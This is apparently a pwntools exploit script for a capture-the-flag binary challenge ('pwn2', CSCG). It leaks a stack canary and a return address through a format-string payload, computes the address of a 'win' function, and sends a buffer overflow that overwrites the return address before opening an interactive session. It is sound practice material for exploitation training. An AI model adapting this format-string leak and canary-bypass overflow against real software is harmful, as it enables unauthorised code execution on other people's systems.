from pwn import *

p = process("./pwn2")
#p = remote("hax1.allesctf.net", 9101)

FORMATSTRING = "|".join(["%lx" for _ in xrange(0,38)])
FORMATSTRING2 = "|".join(["%p" for _ in xrange(0,4)])

MAIN_TO_WIN_OFFEST = 0x231

p.recvuntil("Enter the password of stage 1:")
p.sendline("CSCG{THIS_IS_TEST_FLAG}")
#p.sendline("CSCG{NOW_PRACTICE_MORE}")

p.recvuntil("Enter your witch name:")

p.sendline(FORMATSTRING + "|" + FORMATSTRING2)


LEAKS = p.recvuntil("enter your magic spell:").split("|")
CANARY = int(LEAKS[-4], 16)

MAIN = int(LEAKS[-2], 16)
log.info("Leaked return value 0x{:x}".format(MAIN))
log.info("Leaked CANARY value 0x{:x}".format(CANARY))


WIN = MAIN-MAIN_TO_WIN_OFFEST
RET = WIN+0x36

raw_input("attach gdb")


PADDING1 = "A"*cyclic_find("cnaa")
PADDING2 = "A"*cyclic_find("caaa")
p.sendline("Expelliarmus\x00" + PADDING1 + p64(CANARY) + PADDING2 + p64(RET) + p64(WIN))

p.interactive()